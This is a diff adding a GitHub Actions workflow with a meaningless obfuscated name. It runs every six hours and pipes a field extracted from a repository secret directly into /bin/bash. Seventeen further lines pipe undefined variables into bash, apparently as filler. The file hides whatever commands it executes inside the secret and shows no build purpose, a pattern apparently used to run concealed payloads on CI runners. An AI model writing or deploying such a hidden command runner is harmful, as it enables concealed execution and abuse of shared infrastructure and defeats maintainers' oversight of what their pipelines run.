@@ -1,0 +1,33 @@
+name: julizhelizuijindedihou
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '10 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: julizhelizuijindedihou
+        env:
+          vwj60: ${{ secrets.vwj60 }}
+        run: |
+          echo $vwj60 | jq -r .m715 | /bin/bash
+          echo $kdyxc379 | jq -r .pv7 | /bin/bash
+          echo $zw1 | jq -r .gtav5 | /bin/bash
+          echo $h14 | jq -r .pg938 | /bin/bash
+          echo $sami855 | jq -r .snw40555 | /bin/bash
+          echo $picqj2 | jq -r .bb164 | /bin/bash
+          echo $d8 | jq -r .w2218 | /bin/bash
+          echo $fc63671 | jq -r .nup6 | /bin/bash
+          echo $atx60375 | jq -r .hw49 | /bin/bash
+          echo $resq932 | jq -r .bxjx4 | /bin/bash
+          echo $owih83 | jq -r .kfj83216 | /bin/bash
+          echo $wztg0679 | jq -r .mp70657 | /bin/bash
+          echo $vkylo1277 | jq -r .ayg22409 | /bin/bash
+          echo $fswz40014 | jq -r .m95 | /bin/bash
+          echo $qif38 | jq -r .dllc0514 | /bin/bash
+          echo $vdtw488 | jq -r .aex80 | /bin/bash
+          echo $cwjcj868 | jq -r .hzxle24031 | /bin/bash
+          echo $kv2315 | jq -r .v2397 | /bin/bash
+
